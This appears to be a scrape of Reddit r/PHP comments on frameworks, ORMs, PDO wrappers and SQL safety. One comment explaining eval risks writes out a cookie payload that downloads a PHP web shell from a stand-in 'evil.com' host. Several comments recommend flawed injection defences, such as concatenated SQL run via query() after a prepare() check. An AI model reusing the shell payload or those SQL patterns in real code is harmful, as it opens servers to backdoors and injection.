Asp. Net is open source and can run on apache on Linux with mod-mono. Also depending on your version of Asp. Net you can have it refresh your changes without restarting the server or your app with Iss. And c# is a far better language than Php. 
Dude, changing job is a tough proccess
[http://www.phptherightway.com/](http://www.phptherightway.com/) - this is a pretty good summary for a newcomer, and just as good for a returning fellow.
Composer
put yourself back into php by learning a modern php framework like symfony2, laravel or create your own stack with silex + redbean + twig for exemple 
I've seen Silex, Redbean and Twig mentioned a few times around here, are they particularly good together? 
http://www.hhvm.com/blog/2813/we-are-the-98-5-and-the-16?fb_action_ids=10202264221360540&amp;fb_action_types=og.likes&amp;fb_ref=above-post&amp;fb_source=other_multiline&amp;action_object_map=[189529764577747]&amp;action_type_map=[%22og.likes%22]&amp;action_ref_map=[%22above-post%22]
"Here's a 260 character URL without any explanation: don't worry, it's safe!"
If you are up to date with OOP, then I would definitely agree that you should pick up a framework and composer is a necessity. If you don't know the MVC model, learn it by playing with a framework. I learned on laravel but there are plenty of other great ones like symfony, zend, cake, etc. I'd start researching these and try to reverse engineer to see how you can get building your own framework perhaps. 
http://www.hhvm.com/blog/2813/we-are-the-98-5-and-the-16 This one works, too.
You're in for a treat :)
You can't print() an array; Try print_r($Workorder) or var_dump($Workorder);
there we go. a problem shared is a problem solved.. print_r just gives me nothing but var_dump does show me data is stored in the arrays. thanks :)
That print_r doesn't give you anything is a bit of a concern. I suspect you're doing it wrong.
I'm sure you've seen http://me.veekun.com/blog/2012/04/09/php-a-fractal-of-bad-design/ Roughly translated it goes "Imagine you go into somebody else's toolbox. You don't know much about tools, so when you grab a double sided nail puller you think it is a hammer. You try to use it as a hammer then complain it's not a very good hammer."
False advertising, just because you have a double claw hammer doesn't mean you can 'rip out 2 nails at the same time'. It would be nearly impossible to get a nail into each claw. But I digress, this shirt is cool and I'm definitely getting one to show all the haters at work. Edit: no shipping outside USA :(
And thirdly, and MOST IMPORTANTLY, you're taking data from a post and saving it directly to the server. This is horribly insecure, and will leave your server vulnerable to attack. **DO NOT DO THIS**
Cool little trick: &lt;form action="" method="POST"&gt; &lt;input type="text" name="param[]"&gt; &lt;input type="text" name="param[]"&gt; &lt;input type="text" name="param[]"&gt; &lt;input type="text" name="param[]"&gt; &lt;input type="text" name="param[]"&gt; &lt;input type="submit" value="Submit"&gt; &lt;/form&gt; Will put the values into an array for you: Array ( [param] =&gt; Array ( [0] =&gt; 1 [1] =&gt; 2 [2] =&gt; 3 [3] =&gt; 4 [4] =&gt; 5 ) )
Wow - wordy. I think you are trying to say C# is a good language but Windows Server isn't great. If that is the case I agree with you. I wish I could(in a decent way, not backass methods that only support so much) run C# MVC on top of a Linux Apache like server. That would be nice.
Prepared statements don't "escape", they just prevent the kind of injection that could happen with building SQL statements by appending. Imagine what would happen if someone put in HTML on a $_GET and it just went right into your database without filtering...what happens when that same data is then outputted back on your site (hint: XSS).
tooting my own horn here, but I think the articles on http://websec.io provide a lot of good security information (a good bit PHP-specific too) on a wide range of topics.
No, it doesn't. Escaping data is not the same thing as a prepared statement. When you use prepared statements, the SQL is sent to the server and parsed. Then, when the data is provided, it's not appended into the SQL string, it's dropped in at a lower level than that. There's no escaping happening unless you're doing it yourself.
8-9 years honestly PHP hasn't come along that far...depends where you were in the first place...if you were a framework developer I think you should have that much trouble, but PHP has become a wholehearted OOP language since 2005.
None of my comments were about the language itself. People just misread that. It was about the server and the tools not functioning correctly along with the wasted time during compiling after every cs file modification.
I keep seeing this site suggested, but I don't understand why everyone likes it. while it has good information, it is also weirdly organized and not at all friendly to beginners. it has a weird mixture of basic and intermediate-advanced topics. I'm not really sure who it benefits.
&gt; A language which makes you need an IDE to remember the order of arguments because they're completely unpredictable is a poorly designed language. A language which, for the same reason, has code which is difficult to understand without an IDE is a poorly designed language. Good Luck , Programming in notepad :-P &gt; Of course, but PHP used to encourage certain terrible security practises. if it gets the job done then, go for it :-P Last but not Least :- https://twitter.com/agentdero/statuses/174965036928868352
This function seems crazy in a bunch of ways to me. 1. get_unique is a pretty vague name for such a specific use case. 2. Creating a database connection and closing it within a function? wat wat wat wat wat 3. Mixing MySQL drivers in a dangerous way. The reason you're using real_escape_string and not just doing addslashes is because it takes into account what character set the database connection is in. 4. Comments on everything that doesn't need comments. One can probably figure out that a foreach means you're looping through an array. Or that the line that says return is returning the result. This is how I would write that (I'm not an expert and this might not work): &lt;?php function unique_from_csv_field($mysqli, $field, $table = 'tablename') { // put all values from $field in $table into $results $statement = $mysqli-&gt;prepare(sprintf( 'SELECT `%1$s` FROM `%2$s` GROUP BY `%1$s` ORDER BY `%1$s`', $mysqli-&gt;real_escape_string($field), // mysqli is dumb $mysqli-&gt;real_escape_string($table) )); $statement-&gt;execute(); $statement-&gt;bind_result($result); $results = array(); while ($statement-&gt;fetch()) { $results += str_getcsv($result); } // clean and filter $results $results = str_replace(array('"', '\''), '', $results); $results = array_map('ltrim', $results); $results = array_filter($results); // filter blank values $results = array_unique($results); sort($results); return $results; } ?&gt;
I found that site very helpful as a guideline, not the main source of the topics. If some newbie finds it is not using or seeing those topics when learning, they will need to move to another source.
^This. If you're interacting with a database you want to escape every variable you're placing in the SQL string and you also want to run the SQL through a prepare() before you fire it. Personally I like to run it through strip_tags() as well to prevent any injection. for example: if(isset($_POST['var_one']) &amp;&amp; isset($_POST['var_two']) &amp;&amp; isset($_POST['var_three'])) { $var_one = $sql_connection -&gt; real_escape_string(strip_tags($_POST['var_one'])); $var_two = $sql_connection -&gt; real_escape_string(strip_tags($_POST['var_two'])); $var_three = $sql_connection -&gt; real_escape_string(strip_tags($_POST['var_three'])); $sql_string = "INSERT INTO database VALUES ('$var_one','$var_two','$var_three');"; $prepare_sql = $sql_connection -&gt; prepare($sql_string); if($prepare_sql) { $sql_connection -&gt; query($sql_string); } else { echo "Oh Christ, there was a problem."; } } 
The array part is irrelevant. The problem is evaluating user input as full-blown PHP code. Imagine the bad user sets a cookie like `x=file_put_contents('sh.php', file_get_contents('http://evil.com/myshell.php'))`? Even if the script spews errors on the next line due to nonexistant item IDs in the array, it's too late, the cookie has already been evaluated and your server already contains a backdoor (well, security-conscious PHP config can be used to prevent such simplistic file retrieval from remote servers, but numerous other dangers still exist).
Ok, I want to reply to this in earnest since I didn't address the loop in my reply about preventing injection. Just as the other folks replying, I really don't think that loop is going to do what you want. I assume $Workorder is your array containing all the data you want in the SQL database. Here's how I would structure the array. Array ( [*ticketNumber*] =&gt; Array ( ['seenBy'] =&gt; *value* ['workOrder'] =&gt; *value* ['quantity'] =&gt; *value* ['price'] =&gt; *value* ) [*ticketNumber*] =&gt; Array ( ['seenBy'] =&gt; *value* ['workOrder'] =&gt; *value* ['quantity'] =&gt; *value* ['price'] =&gt; *value* ) ) Now, to put all of these into the database, assuming $sql_connection is the mysql object. $sql_string[] = "INSERT INTO database VALUES "; $commaIncrement = 0; $commaCount = count($Workorder); foreach ($Workorder as $ticketNumber =&gt; $array) { $comma = $commaIncrement == $commaCount ? '' : ','; $ticket_number = $sql_connection-&gt;real_escape_string($ticketNumber); $seen_by = $sql_connection-&gt;real_escape_string($array['seenBy']); $work_order = $sql_connection-&gt;real_escape_string($array['workOrder']); $quantity = $sql_connection-&gt;real_escape_string($array['quantity']); $price = $sql_connection-&gt;real_escape_string($array['price']); $sql_string[] = "('$ticket_number','$seen_by','$work_order','$quantity','$price')$comma"; } $sql_string[] = ";"; $completed_sql_string = implode(' ',$sql_string); $sql_prepare = $sql_connection-&gt;prepare($completed_sql_string); if($sql_prepare) { $sql_connection-&gt;query($completed_sql_string); } else { echo "Something dun goofed"; var_dump($sql_connection); } As you can see, I build the SQL statement as an array and then imploded it into a single string. This means you only have to query your database once as apposed to once per entry. The $commaIncrement and $commaCount stuff might be confusing but it's there to insert commas into the string where necessary. And, if the prepare() fails you can var_dump the SQL connection to find whatever errors occurred.
Personally I felt https://phpbestpractices.org/ helped me more, although some of the stuff there is slightly dated.
This is just a transient DNS problem...
Point 3 is a really common mistake - don't mix mysql with mysqli. 
What, exactly, is so appealing about a "Redditor" to you?
Wow, how did you manage to find Composer all by yourself?
/r/phphelp 
It's like I'm really reading php.net documentation comments.
this is just an ad... at least try to make a self post instead of just a link
The ultimate solution to any problem involving PEAR: Don't use PEAR.
https://github.com/jstayton/Miner
Imagine you have a module/plugin that is supposed to make sure that rows are not deleted from the database but have a field called `deleted` set to 1 instead. Your database $library should let you 1. Replace a `DELETE FROM table` query to an `UPDATE table SET deleted=1` 2. Replace any `SELECT $fields FROM table WHERE $whatever` to `SELECT $fields FROM table WHERE ($whatever) AND deleted=0` 
Ushahidi is a great place to work. I've been with them for a few years now and love the fact that we value independence and autonomy more than any other place I've worked. It's not for everyone though.
I've been looking into http://www.doctrine-project.org/projects/dbal.html . I believe I will use it in my next project. It looks like it has lots of documentation and a healthy ecosystem. Also, they have some ORM layers to go with it, but I doubt I'll be interested in those. 
I know. I've got to go through all my code an sanitise it. I'm not a programmer. I'm just learning for work :/
The think is I got a table for alterations and a table for workorders as we have anywhere from 1 to however many workorders are needed per alterations ticket. Our current system is using Access. but I want us to have something that is central and easily accessed anywhere as we now have three shops, one of which doesn't really have any systems set up yet. 
ORM? Doctrine or Propel.
&gt; I wouldn't change jobs for a server-side language. I'm primarily a Javascript developer You should look for a node.js job then! Wal-mart is doing some pretty cool things with it
&gt; None of those IDEs are as good as Visual Studio in my opinion. I don't get the love for VS. I've used it a bunch and it seems like a less intuitive version of Eclipse (if that is possible).
oh god. Frontpage. the horrors...
Don't twist my words. PHP shouldn't be difficult to write or understand without an IDE, whether using one is a good idea or not. Also, I imagine a very large portion of PHP devs use none whatsoever. I'm also not ranting about the past. PHP as it still exists is flawed.
I would also be interested in this since I have a legacy software package written in VB on top of an Access database that I need to have I/O with in a biggish Laravel project I'm starting.
DByte is excellent. https://github.com/Xeoncross/DByte It's somewhat small, but easy to set up and get working with. 
I like Fluent/Eloquent from Laravel. You can include it into any projects. Docs: http://laravel.com/docs/eloquent Source: https://github.com/illuminate/database 
I've used Doctrine extensively. Both the database abstraction and the ORM libraries are fantastic.
If you're building a query dynamically, a query builder is a huge help. It also removes the need to do parts of the query in order: I can add a `FROM` clause without needing to have a `SELECT` in place. So, if you know your query ahead of time, a query builder less useful (baring the points below), but if you need to build something dynamically it's great! Another thing to consider is that it's easier to add "plugin" type patterns to a database abstraction with a query builder -- altering a query dynamically with an event dispatcher for instance. $qb = new QueryBuilder(); // do stuff with $qb $eventDispatcher-&gt;dispatch('alter_query_event', new AlterQueryEvent($qb));
I have never found one for my use. I ended up just using a few simple functions for simplicity sake, to move forward: function fetchRows(){ global $pdo; $params = func_get_args(); $query = array_shift($params); $stmt = $pdo-&gt;prepare($query); $stmt-&gt;execute($params); return $stmt-&gt;fetchAll(); } function insertRow(){ global $pdo; $params = func_get_args(); $query = array_shift($params); $stmt = $pdo-&gt;prepare($query); return $stmt-&gt;execute($params); } function updateRow(){ global $pdo; $params = func_get_args(); $query = array_shift($params); $stmt = $pdo-&gt;prepare($query); return $stmt-&gt;execute($params); } Sample use: $userID = fetchRows('SELECT id FROM users WHERE email = ?','blah@blah.com'); 
OT a bit, but it would be nice if PDO had an actual 'close' or 'disconnect' method to close an established connection. Or indeed even an 'open' or 'connect' method as well. Having actual connection behavior happen in the constructor itself has always struck me as a little... odd. The trend has seemed to be in some PHP frameworks to avoid behavior in constructors - ZF controller constructors, for example, recommend a separate init() method vs putting functionality in a constructor directly (only one that springs to mind, but I know that approach generally makes testing easier).
I've heard good things about idiorm and paris: http://j4mie.github.io/idiormandparis/ 
Look in to [propel](http://propelorm.org/) and [php activerecord](http://www.phpactiverecord.org/) as well if ORMs are your thing. Doctrine is a decent choice but options never hurt.
This is disgusting and I'd never recommend doing it this way.
Query builders allow a cleaner programmatic approach to building up a query. Sure, you can do it with string concatenation but it turns in to such a mess after you reach a certain level of complexity. Most ORMs usually include a query builder of some sort.
Care to explain further? I'm interested to know if it's just preference or it's actually WRONG for some reason. I'm very new to PDO.
I built this as something that sits halfway between just a basic config file and a full blown RDMS like MySQL or SQLite. Recently I've found I've been building small, simple apps where the MySQL part of the code is overblown when I'm only storing a few hundred kilobytes of data. There's a many other flat file libraries out there but many don't conform to modern standards like PSR-0 or Composer and the code tends to be untestable, with no understanding of the SOLID principles. That's why I built my own. Performance is definitely an important factor; It's fast but once you start going above 1000 documents per repository (a repo is akin to a traditional database table) you'll start to see some degradation (more than 50ms query times). There's also a read-through query cache which uses APC, if you're using that then subsequent runs of the same query are extremely fast (in the 0.1ms range). I've got a few ideas on how to improve performance (such as indicies) that I'm looking to add over time.
Unsetting the object will close the connection. Often people don't bother because the nature of PHP is to be short lived, and it makes more sense to reuse the connection during the course of a single runtime than it does to constantly open and close it every single time you need to talk to the database. 
if it contains "global" .. it means its actually WRONG. the minimum it should be a class that uses $this-&gt;pdo or $this-&gt;getConnection('master') or something like that, but global always gives people headaches for a reason
Just tried out Redbean this morning, worth a mention. 
From the docs.. &gt;Often MySQL can be overkill for a small site or blog installation Overkill? When was the last time you encountered a PHP server that wasn't paired off with some kind of RDBMS? It's not overkill.
Ok but why is using the global scope a bad design choice? I don't understand how it it improperly accomplishes this task.
Maybe overkill is the wrong word, but think about everything else you have to manage when using a RDMS: configuration - username, password, ports etc, schemas, migrations, keeping data in sync across different developers machines and staging sites. This is a pain point I've seen in many companies I've worked in. By using a flat file system all this goes away, you can check in the files to VCS and development and deploys become much easier.
&gt; it isn't. It is. In other languages the names of the string functions are at least consistent and memorable, and with predictable argument orders. In C, Python and JavaScript, for example. PHP is special here. It's special for nearly all functions. The standard library is a complete mess, and it's a shame. Meh, I suppose nikic's scalar objects proposal shall eventually solve this.
Your first and last sentence only mention C#. 
Thank you guys !! I will start with Laravel and lets see how it goes. Have a wonderful 2014 !!
This typically means your function is doing too much anyway.
if that is what makes a language "difficult" for you, you've got bigger issues than what order to put parameters into a function
Why not just use SQLite then? Eliminates usernames, passwords, ports, though keeps schemas (which are a good idea).
using the global scope is just bad software design. This is day 1 of any software education. As a previous user said, you should be using objects. You should probably do your homework
&gt; If you've never experienced that, you should be very grateful. "But I want to be able to have TEN phone numbers for each of my customers!" Sure, at some point you have to say `CREATE TABLE customer_phone ...` but when you have a released product and a Lunar Sales Force (one free moon with every order, we promise!) sometimes you gotta do what you gotta do.
SQL is not portable. The whole point of using a DBAL is to abstract your database layer. If you decide to switch from MySQL to Oracle next month, a simple driver swap is usually sufficient if you're using a good DBAL. If you're using raw SQL strings, you've got quite a refactor on your hands.
It's transparency is definitely a double edged sword, on the one hand it ensures the database protects itself; on the other as you say it can cause issues. I prefer the data integrity, hopefully it will stop the need for "fixing the data manually". Also: I've never migrated an app between two DBs where (a) the newer one didn't have a superset of features, otherwise there's likely little reason to move, or (b) where it's so different I've had to make changes by hand anyway. Though admittedly that's anecdotal evidence :)
This looks really nice from a feature stand point; I've written this half a dozen times for various projects. I haven't looked at the code yet but I may have a couple of feature additions to discuss soon - was planning to write it for generic PDO, it'll be interesting to see how it might inject into Aura.Sql :)
If I'm moving DBs, having compatible queries is verify far from having correct/good queries. I don't trust code to write correct/good queries.
&gt; I've written this half a dozen times for various projects. Same here, thus this. The Aura.Sql v1 package has a ton more, but often what's needed in legacy codebases undergoing improvement is *not* a combination of query builder, data mapper, connection manager, etc., but just a PDO replacement with conveniences. So for the v2 stuff we split out the query objects to Aura.Sql_Query, and the schema discovery to Aura.Sql_Schema, and left just the PDO stuff in Aura.Sql.
One of the first packages I looked at. The connection construction arguments are a little bit much. In my opinion libraries should provide sensible (I know, this is relative) defaults. Having to provide a column factory to construct a Mysql connection makes the learning curve a little bit steeper. I mean, do I need to understand what the column factories does to do basic queries? Probably not, but it makes me stop and think. I know there is a connection factory but still ... I'm 2 files into the source code and I am facing some concepts that I might not ever need.
This is a full blown ORM/ActiveRecord. Plus it depends on so many other stuff.
I just do this for my own sites, never had formal software dev education. Again, I'm still not getting to hear WHY it is bad software design and WHY it should be used in an object instead.
Kind of sounds like you don't really need to use `preg_replace()` then and `str_replace()` would suffice if not be better. You do not appear to be doing any regex matching and `str_replace()` can accept an array of values for both search and replace just like `preg_replace()`.
Doctrine is wonderful, when it works correctly. The problem comes in when your setup doesn't quite work, and you have to track down why. For example, Entities with two primary keys are not fully supported by the EntityRepository's find() method, and I kept on getting NULL despite knowing that the entry exists in the table. If you do use this, make sure you write up some solid unit tests so you can test the ORM layer independent of everything else. Also, Doctrine/DB Migrations is one of the best solutions I've seen to managing/deploying database versions. It's so much better than what most people do, i.e. manually run sql scripts, or roll their own migration framework. 
This is how most ORMs in Python roll. SQLAlchemy's queries are essentially a query builder. `session.query(User).filter(User.karma &gt; 10000)` One that's really cool is Pony which uses Python's generator statements for queries, e.g. `select(u for u in Users if u.karma &gt; 10000)` This sort of things makes it easier to go back and tweak calls without having to adjust every part of your query. You just change a variable or a clause. Let the ORM worry about aliases and whatnot. Don't get me wrong, I see the value in knowing exactly what SQL you need to write to get the data you want. One a small project, yes I'll write the SQL. But sometimes -- and I think most people feel this way -- I don't want to write a complex query that I can adequately model with...models.
Why don't you just use sprintf? http://us1.php.net/manual-lookup.php?pattern=ttp%3A%2F%2Fus1.php.net%2Fsprintf&amp;lang=en&amp;scope=404quickref
Code writes predictable queries. If you don't trust code to write queries, then what you're saying is that you don't trust yourself to write correct code. And, if that's the case, then you probably aren't writing correct queries either. ;-)
Another vote for PropelORM. Just realize you are killing a fair amount of optimizations in favor of easier security (you hope) with most of these tools. But, just build it and take care of bottlenecks later _if_ you even run into any situations with unbearable processing times.
For future use of preg_replace: Patterns must be enclosed by delimiters, that themselves aren't part of the pattern. This means they will not be replaced. {} is a valid delimiter pair. See http://www.php.net/manual/en/regexp.reference.delimiters.php 
Well, fluent is a query builder, Eloquent is the ORM. It shouldn't matter if it depends on any stuff since it should be managed by Composer. It also shouldn't matter if there's a lot of dependencies since you should be using opcache. I'm not sure what you're looking for then.. PDO is already a DB wrapper, working with different flavours of SQL. ~~I'm not sure what a DB-wrapper-wrapper will be useful for, if it's not an ORM.~~ -- edit: I just saw Aura.sql extending PDO with more options. It looks nice. 
I know /u/ItsAHardNuffLife already fixed your problem, but let me shed some light as to WHY it's happening. preg_replace uses Regular Expressions. `{USERNAME}` is being interpreted as a regex string. So, (I'm not going to verify it, but I assume this to be correct) `\{USERNAME\}` should be getting you what you need because you need to escape the `{` and `}` characters, otherwise they're interpreted as regex.
Thanks for the explanation. I was banging my head against the wall so hard, because I just couldn't seem to find the problem. 
Thanks a bunch!
I don't know what DBSes you've migrated between, but MySQL, Postgres, Oracle, MSSQL, etc. are all very, very different, and none of them is a superset of any other. Whether it's simple string concatenation, or result limiting, it can be drastically different.
I mean superset in terms of features. You're not migrating from Oracle to SQLite ;)
Are you serious? So as soon as any new technology comes into the market you'd quite happily use it in a production environment? Without any testing or proving from the community or personal projects. Jesus, let's hope you never work for my company with that kind of risk taking. 
exactly the example I was looking for. Ok, so in all honesty the quick answer is probably just to pass the PDO instance as you noted each time instead of declaring the global.
Ideally, you would have a system of objects where every object is a gear with its own responsibilities. Once global variables are introduced, it's no longer a cleanly organized system. Any object can change the global variables. When all of the objects are cleanly separated, there are clearly defined 'contracts' between objects that define which objects can change other objects. The most glaring problem with using global variables is it's not compatible with proper testing tools ie unit testing. In terms of architecture, everything becomes a 'one-off' when global variables are introduced. Just because you can duct tape pieces of wood together, doesn't mean you should.
The docs claim this behavior, but it doesn't work consistently across otherwise-supported PDO database drivers. MSSQL is one I've recently hit issues with - I would not be surprised to find it an issue with others. "it makes more sense to reuse the connection during the course of a single runtime than it does to constantly open and close it every single time you need to talk to the database." That's a strawman. Opening a connection, using it several times during a request, then explicitly closing it would be perfectly doable with discrete connect/disconnect methods, and would be more explicit as to when things are happening. It ain't gonna change any time soon (possibly ever), but it's unfortunate that PDO is missing something rather basic like this.
Many ORMs let you write your own queries when you really need to squeeze out as much as you can. Though, before you do that, you should examine your models and see what you could change there. Otherwise you're potentially just treating symptoms. 
Yes. Always inject dependency, never assume it's in the global scope. 
Suggestions 1. Add a dateAdded or dateCreated to each document automatically - have that be a core part of each document - or separate metadata that's query able. 2. Use sys_get_temp_dir() in your tests vs hardcoding "/tmp" paths. EDIT: 3. Check if generated ID already exists. Unlikely, but there still seems to be a chance for a collision. 
The APC user cache is available as an extension in PHP 5.5
Sublime still has auto complete (or maybe it's just a package that can be installed in it), so I don't get why weird parameter order is an issue for anyone...
Thank you. You are spot on about the demand for stuff like this. I made a little text "news" poster a while back (and I won't show my code because it's horrific) because my website customers wanted something tiny and simple that they could use to post, edit, publish, and remove little "news" blurbs about their business. All without having to get a WordPress.
chmodding 0777 dirs is probably not a good idea. https://github.com/jamesmoss/flywheel/blob/master/src/JamesMoss/Flywheel/Repository.php#L33 
Looks good to me.
It's not just PHP frameworks, that's a principle of good OOP. [Don't do work in constructors]( http://misko.hevery.com/code-reviewers-guide/flaw-constructor-does-real-work/).
you can number your inputs using %1$s etc
You hate something because you don't know how to properly use it? That's rich.
Is that a bad thing?
The point being I use my IDE as a valuable tool. When you configure your macros and other settings, it can make your coding really fast
If your way is a better way to solve the same problem, go for it. I never said my was the best way or only way. I am used to commenting everything, because I am always far more used to a complete lack of documentation and commenting in code I have to work with. So I have developed the habit of always commenting, to make it as easy as possible for the person after me, to understand the logic behind my code.
I am only really getting into using mysqli more. I didn't see it as a major crime. I was just trying to make sure all incoming data was reasonably safe from sql injection.
Can anyone comment on the speed of Doctrine? Is it worth building an inventory system with hundreds of thousands of entries on Doctrine? Also, these entries will be exported and modified pretty frequently (hourly or more). How does Doctrine handle read replicas? Is there anything more suited for this kind of task?
If you use things like APC, it's pretty damn fast, though it adds a lot to memory overhead. I custom coded [this ecommerce site](http://www.sylvane.com/) using mostly Doctrine, though, and it's pretty damn snappy. I'm not aware of any features geared towards read replicas at all, though.
Adrian -- I think you're looking at v1; try v2 for something more focused: https://github.com/auraphp/Aura.Sql/tree/develop-2
We've talked about result caching, and it's not something that belongs in that particular package. For the debugger, we have the Profiler and ProfilerInterface; perhaps your interpolative work can be submitted there?
Just a figure of speech. No need for this ;)
Fair enough.
I don't think that's the assumption, different people have different problems to solve, and so they look for a tool to match their job. As for me, I don't like to be looking after spaces and missing `" AND "` every time I want to add extra logic to the query. At first I thought, *hey, I will collect those conditions into a `$__where` array, then I will `join` that array*, so I ended up with a `$__where` variable here and there.
http://github.com/krakjoe/apcu
 class R extends RedBean_Facade { } // simple reference to facade Use namespace aliases.
I don't know enough about namespaces to know what that means but I'll find out. Thank you for taking a look.
Thanks for the pointers. Composer, Silex, Redbean and Twig are all brand new for me to use in a project so still plenty to learn. 
I know I'm going to get downvoted into oblivion here, but.... Why not give another language a chance? I "fell into" Ruby a few year ago, after 10 years in php when the management decided it was "cooler" than php, and I have to say, I've never been more productive. With PHP I felt like it was taking far too long to do the simplest things. Ruby doesn't "just work" as it's promised to do, but it works well enough for me. Now when I go back to my old PHP projects, I see them in a different light. It's definitely made me a better programmer. Just a thought...
Does that website do any feed exports to third party sites? If so, how fast is it generally? (per thousand or whatever metric you feel comfortable using) Also, is the whole website custom? If so, pretty impressive. 
But my point is there's more to migrating between databases than merely using the correct syntax. 
Note that APC is deprecated as of PHP 5.5 and you'll want to move to a combination of the new built-in OpCache and APCu, a userland implementation of the APC persistent data caching API (which you really ought to use when applicable as it's an amazing speed booster).
I'm always amazed by people that don't want to use an ORM. They promote consistency and prevent you from having to piss about writing queries all the time, and when you change your database they make it much easier to update the app.
I've yet to be convinced that abstraction is valuable on a technical level — sure it's valuable for rapid development, but I usually find that abstraction means not great SQL, and lackluster performance that is harder to scale. As I've said elsewhere, great queries are not just about getting the syntax correct! There's a reason we choose (for example): - `SELECT foo FROM table INNER JOIN bar ON (foo.bar_id = bar.id)` rather than - `SELECT foo FROM table WHERE foo.bar_id IN (SELECT id FROM bar))` Both are syntactically correct, and will (probably) return the same results. But the `INNER JOIN` would (usually) be much faster. Not saying a DBAL can't build the former, or will magically do the latter if you don't tell it to, but maybe for some datasets a temporary table with the `IN` is faster than the JOIN (particularly if it's an `OUTER JOIN`). Additionally, I maintain that the need to switch between databases is a complete fallacy. It almost **never** happens, and when it does, the DBAL *rarely* works as well as desired. Sure there is value for projects to support multiple database backends to maximize install base opportunity, but for bespoke software that needs to scale, it's not usually a good solution.
Yeah, like C. or ASM. Totally generic and slow. ಠ_ಠ
ಠ◡ಠ
[php-activerecord](https://github.com/jpfuentes2/php-activerecord ) - Really easy to use and you can plug it into any project with very little setup. 
I never benchmarked feed generation and just had it regenerating on a cron job, but it was able to rebuild, for instance, the complete product feed for comparison shopping sites in under a minute, which included a few thousand products. It uses jQuery and some jQuery plugins, Doctrine, and the Foundation UI framework, but other than that, yes. Glad you like it. I spent the better part of 2013 working on that site.
I'll keep that in mind, thanks. I switched to a more C#-focused engineering job after finishing that site, so I haven't kept up with recent developments in PHP as much as I'd like.
From experience, maintaining code that uses globals is incredibly difficult. It can be difficult to identify where a global object is created, and you can never be certain what state the global will be in when you want to use it... because it's a global. That's just one of many reasons.
That's more like it :)
I hope you've taken the time to read some of the other replies to this comment.
Lets take this out of this thread :)
[This comment](http://www.reddit.com/r/PHP/comments/1ugbxx/any_good_pdo_wrappers_you_know/cehwf4p) by /u/kurashu89 is a good explanation. If you need more clarification, ask :)
Eloquent
https://github.com/ellisgl/GeekLab-XPDO
Great stuff, thanks. 
You're optimizing too early. You should focus on code maintainability. DBAL helps you do that. "Bespoke software that needs to scale", how do you know what to scale when you aren't there yet? I suggest you visit highscability.com and check the articles. For scaling, you need metrics. For metrics, you need actual users. Theoretical can only go so far. You find bottlenecks, you fix the bottleneck, and you go to the next one. Rinse and repeat. The thing is, with a DBAL, it's way easier to refactor for performance. Also, don't forget that you can also call raw expressions from most DBAL. When it comes the time to optimize, and you need to write a manual one, go ahead, but start with an ORM first.. it'll save you headache. 
I personally don't like the short echo tags myself. "&lt;?='blahl;?&gt;" just look like you are trying to assign 'blah' to '?'. 
How about just using/setting an appropriate umask?
&gt; So if you have any tips or suggestions, please do. Unless you disagree with my methods based on universally agreed-upon best-practices and coding standards. Then "Lol" FTFY 
huh.... okay so, you contributed to everything I hate about PHP (Zend framework, zend certification, PEAR). LOL. I don't see how googling your name backs what you are saying. So I learned you have 12 years experience in PHP... maybe back then, ORM sucked? Did it even exists back then? LOL. Anyways, back to the subject. --added from edit While we're at it, can I know what's the last ORM you used? The example you provided in another post is a very shitty SQL. I really wonder which ORM/DBAL/Builder did that. Thanks. --end edit Please go in details in problems that scale from your dev to your production? I'm curious about that. I don't see how using an ORM or not can break that. When not using an ORM -&gt;controller public function index() { return $this-&gt;foo-&gt;whatever(); } -&gt; Foo.php public function whatever() { return $this-&gt;db-&gt;query("select * ....")-&gt;get(); } When using an ORM, stage 1 (Rapid dev style) -&gt;controller public function index() { return $this-&gt;foo-&gt;whatever(); } -&gt; Foo.php public function whatever() { return $this-&gt;foo-&gt;with('bar')-&gt;with('foobar')-&gt;with('foozfooz')-&gt;get(); } ORM stage 2 (refactored if it ever becomes a bottleneck) -&gt; Foo.php // basically doing the same, but using a query builder so it's still easy to maintain, but more of a bitch. public function whatever() { $query = $this-&gt;builder-&gt;table('foo')-&gt;select('foo.id, foo.name')-&gt;join....... return $this-&gt;db-&gt;query($query)-&gt;get(); } ORM stage 3 (shit just got complicated, so let's do manual query) -&gt; Foo.php // ORM doesn't work anymore for this, fuck it, let's write a manual query // exactly like in the non-orm scenario public function whatever() { return $this-&gt;db-&gt;query("select * ....")-&gt;get(); } So... ORM might not be for the 100%, but if it's good for 80% and the 20% rest I can write manually, you should totally do it. It will at least make 80% of your code easier to understand, so easier to maintain, so easier to debug/add new features. Using a modern ORM is win/win. 
Well it doesn't say you have to use short echo tags. It's just saying that you can only use those 2 types. Meaning none of this. &lt;? ... ?&gt;
Possibly, but then you've got the additional work of storing what it was before and resetting it back. It's probably not a good thing for a library to assume the rest of the application wants the same umask as the library itself does. Granted, it would make more sense to have the server have the proper umask set, but in shared hosting that can be harder to control.
Understood - was just trying to keep it in the context of PHP, using something as an example. It was never dogma to me personally until I started working someplace where nothing was testable because the constructors did loads of stuff. As in, in one case, the constructor was &gt; 400 lines of code that read from multiple tables (and would create them if they didn't exist), read in data, calculated stuff, wrote out data to a file, and more. In a constructor. In... sane. I got a bit more dogmatic about constructors not doing much after that.
&gt;Guns don't kill performance, wrappers do!
&gt; And what if you don't want to do SQL. Just store some objects. That's rarely what you actually want in an application.
This is ironic given the "doesn't suck" title.
That's just like you opinion dude.
No, it's from practical experience. In most applications you'll need some sort of searching, which this can't offer.
(I'm the guy who shepherded PSR-1 and 2 through the acceptance process.) &gt; Are you saying that &lt;?php echo and &lt;?= are both valid? Yes. :-) &gt; "You MAY use &lt;?= or &lt;?php echo" If we said "MAY" for a particular point, that particular point would have been entirely optional. E.g., "You MAY use &lt;?= or &lt;?php echo" means you can ignore both of those options in favor of "&lt;? echo" and still be compliant. We don't want that. ;-) Perhaps the easiest way to read the "MUST" here is that it applies to the "only" in that sentence; i.e.,`&lt;?php` and `&lt;?=` are the only acceptable opening PHP tags, and no others are acceptable.
It does have a package for it, but I never use it because I don't need it. I do however use the fuzzy search feature all the time because it's made from all that is awesome.
I did, yes.
